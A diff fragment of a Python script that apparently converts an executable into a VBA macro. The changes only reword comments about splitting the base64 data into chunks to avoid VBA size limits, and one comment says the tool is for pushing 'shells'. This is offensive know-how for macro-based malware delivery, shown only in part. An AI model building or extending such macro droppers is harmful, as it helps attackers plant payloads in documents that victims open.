@@ -40,8 +40,9 @@ print "[+] Encoded data is %d bytes" % (len(b64), )
 b64 = b64.replace("\n","")
 
 ############
-### added check for procedure too large error (65535b) + the variable space.  We are going to split in chunks of 50000 to ensure we are under the cap
-### VBA/Macro has a limit of 65534 lines as well.  Is this per macro or per procedure? Anyways, we need to push the line max out...
+### added check for procedure too large error (65535b) + the variable space.  
+### We are going to split in chunks of 50000 to ensure we are under the cap
+### VBA/Macro has a limit of 65534 lines as well.  Is this per macro or per procedure? 
 ### so 1001 * 65490ish lines, should give us theoretical max of something around 65M bytes for now. 
 ### Should more than enough for any shell anyone is trying to push ;-)
 ############
@@ -51,7 +52,7 @@ x=50000
 strs = [b64[i:i+x] for i in range(0, len(b64), x)]
 
 for j in range(len(strs)):
-	##### Procedure too large error with large executables #####
+	##### Avoids "Procedure too large error with large executables" #####
 	strs[j] = formStr("var"+str(j),strs[j])
 
 top = "Option Explicit\r\n\r\nConst TypeBinary = 1\r\nConst ForReading = 1, ForWriting = 2, ForAppending = 8\r\n"
